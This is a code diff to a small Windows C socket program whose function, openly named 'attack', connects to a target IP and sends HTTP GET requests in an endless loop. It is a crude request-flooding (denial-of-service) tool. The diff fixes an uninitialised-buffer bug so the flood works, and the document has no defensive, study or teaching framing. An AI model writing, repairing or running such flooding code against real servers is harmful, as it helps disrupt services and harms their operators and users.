@@ -11,6 +11,7 @@ SOCKET startSocket();
 void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
 void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
+void attack(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* target_ip);
 
 int main(){
     SOCKET client_socket;
@@ -22,15 +23,15 @@ int main(){
 
     startWinsock(&wsaData);
     client_socket = startSocket();
-
     attack(&serv_addr, client_socket, target_ip);
     return 0;
 }
 
 void attack(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* target_ip){
     connectToServer(serv_addr, client_socket, target_ip);
-    const char* msg;
-    snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
+    char msg[64];
+    int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
+    // printf("%i", sprintf_stat);
     while(1){
         sendMsg(client_socket, msg);
     }
